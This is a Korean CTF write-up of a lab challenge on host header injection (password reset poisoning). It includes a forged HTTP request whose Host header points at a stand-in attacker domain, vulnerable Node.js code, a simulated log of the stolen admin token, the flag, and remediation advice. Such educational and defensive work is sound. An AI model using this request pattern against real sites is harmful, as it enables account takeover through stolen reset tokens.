+++
title = "VulnABLE CTF [LUXORA] Write-up: Host Header Injection 🥉 Bronze"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Host Header", "Bronze", "Password Reset Poisoning", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Host Header Injection 🥉 Bronze

## 🎯 챌린지 개요
- **카테고리**: Infrastructure Layer (Host Header Injection)
- **난이도**: 🥉 Bronze
- **타겟 경로**: `/host/bronze`
- **목표**: 패스워드 재설정(Password Reset) 이메일을 발송할 때, 메일 본문에 포함되는 리셋 링크의 도메인이 클라이언트가 조작 가능한 **`Host` 헤더**를 기반으로 생성되는 결함을 악용하여, 관리자의 리셋 토큰을 탈취하라.

*(참고: 이 챌린지는 인증(Authentication) 카테고리의 Password Reset Bronze 챌린지와 기술적으로 동일한 원리(Password Reset Poisoning)를 공유하나, 인프라 관점에서의 Host 헤더 처리 취약성에 초점을 맞춥니다.)*

---

## 🕵️‍♂️ 1. 정보 수집 및 시스템 동작 분석 (Reconnaissance)

`/host/bronze` 경로의 비밀번호 찾기 기능에서 정상적인 이메일을 입력하고 전송 버튼을 누릅니다.

**[정상 요청 패킷]**
```http
POST /host/bronze/reset HTTP/1.1
Host: localhost:3000
Content-Type: application/x-www-form-urlencoded

email=user@luxora.test
```

**[정상 서버 응답 (시뮬레이션)]**
```text
Email sent to user@luxora.test.
Link: http://localhost:3000/reset?token=xyz123
```

**[해커의 사고 과정]**
1. 링크가 `http://localhost:3000` 으로 만들어졌다. 이 주소는 서버 설정 파일에서 온 것일까, 아니면 내가 보낸 HTTP 헤더에서 온 것일까?
2. 내가 보내는 HTTP 패킷의 `Host: localhost:3000` 을 `Host: evil-attacker.com` 으로 바꿔서 보내보자.
3. 만약 서버가 이 헤더를 믿고 링크를 `http://evil-attacker.com/reset?token=...` 로 만든다면, 관리자 계정을 털 수 있다!

---

## 💥 2. 취약점 식별 및 공격 설계 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(Host: attacker.com)--> [ Web Server ]
                                       |-- Generates Password Reset Link
<-- Link: http://attacker.com/reset ---|
```


이 취약점은 애플리케이션 프레임워크(Node.js, PHP, Django 등)가 현재 자신에게 접속한 사용자의 호스트네임을 알아내기 위해, 가장 쉽게 접근할 수 있는 `req.headers.host` (또는 `$_SERVER['HTTP_HOST']`) 변수를 무비판적으로 신뢰할 때 발생합니다.

### 💡 파라미터 및 헤더 변조
Burp Suite의 Repeater를 열어, `Host` 헤더를 해커의 도메인(Burp Collaborator나 개인 서버 IP)으로 변경하고, 타겟 파라미터(`email`)를 관리자 이메일로 변경합니다.

**[조작된 HTTP 패킷]**
```http
POST /host/bronze/reset HTTP/1.1
Host: my-evil-server.com
Content-Type: application/x-www-form-urlencoded

email=admin@luxora.test
```

---

## 🚀 3. 공격 수행 및 결과 확인

조작된 패킷을 쏘면 서버는 다음과 같은 내부 로직을 실행합니다.

```javascript
// 취약한 백엔드 코드
const targetEmail = req.body.email; // admin@luxora.test
const resetToken = generateToken(); // 777abcd
const hostHeader = req.headers.host; // my-evil-server.com (해커가 조작한 값)

// 조작된 헤더를 바탕으로 악성 링크 생성
const resetLink = `http://${hostHeader}/reset?token=${resetToken}`;

sendEmail(targetEmail, resetLink);
```

### 🔍 공격 결과 (토큰 탈취)
잠시 후, 서버에 있는 관리자(Admin Bot)가 수신된 이메일을 열고, 의심 없이 `http://my-evil-server.com/reset?token=777abcd` 링크를 클릭합니다.

해커의 `my-evil-server.com` 로그에 다음과 같이 접속 기록이 남습니다.
```text
[GET] /reset?token=777abcd
```

해커는 이 토큰(`777abcd`)을 복사하여, 원래 사이트인 `http://localhost:3000/reset?token=777abcd` 에 입력하여 관리자의 비밀번호를 성공적으로 변경합니다.

```text
[!] System: Password Reset Poisoning via Host Header detected.
FLAG: FLAG{HOST_🥉_HEADER_POISONING_C4D5E6}
```

---

## 🚩 4. 롸잇업 결론 및 플래그

HTTP의 표준 헤더 중 하나인 `Host` 헤더조차도 클라이언트가 임의로 조작할 수 있는 "사용자 입력값"에 불과하며, 이를 절대 신뢰하면 안 된다는 보안의 기본 원칙을 확인했습니다.

**🔥 획득한 플래그:**
`FLAG{HOST_🥉_HEADER_POISONING_C4D5E6}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
프레임워크의 편리한 기능(현재 도메인 동적 파악)에 의존하여 절대 경로 URL을 생성한 것이 원인입니다.

* **안전한 패치 가이드 (정적 Base URL 사용)**
이메일 링크, 리다이렉트 URL, 소셜 로그인 콜백 URL 등을 생성할 때는 클라이언트의 헤더를 절대 참조하지 말고, 환경변수나 설정 파일에 하드코딩된 **정적 도메인(Base URL)**을 사용해야 합니다.

```javascript
// ❌ 취약한 방식 (절대 금지)
const baseUrl = "https://" + req.headers.host;

// ✅ 안전한 방식 (환경 변수 또는 설정 파일 사용)
// 서버가 시작될 때 고정된 주소를 가져옴
const baseUrl = process.env.BASE_URL || "https://www.luxora.test";

const resetLink = `${baseUrl}/reset?token=${resetToken}`;
```
웹 서버(Nginx/Apache) 단에서도 자신이 서비스하는 도메인 목록(ServerName)에 없는 `Host` 헤더가 들어오면 400 Bad Request로 요청을 폐기하도록 설정(Strict SNI / Host validation)하는 것이 좋습니다.